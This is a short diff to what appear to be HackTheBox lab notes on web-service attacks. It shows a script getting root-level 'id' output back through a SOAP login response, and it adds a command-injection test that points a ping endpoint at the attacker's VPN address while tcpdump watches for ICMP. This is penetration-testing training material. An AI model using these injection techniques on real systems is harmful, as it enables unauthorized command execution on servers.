@@ -23,8 +23,16 @@ while True:
 [/htb]$ python3 automate.py
 $ id
 b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>uid=0(root) gid=0(root) groups=0(root)\n</result></LoginResponse></soap:Body></soap:Envelope>'
-$ 
+$
 ````
+### Command Injection
+````
+http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3
+```
+[/htb]$ sudo tcpdump -i tun0 icmp
+ tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+```
 
 
 
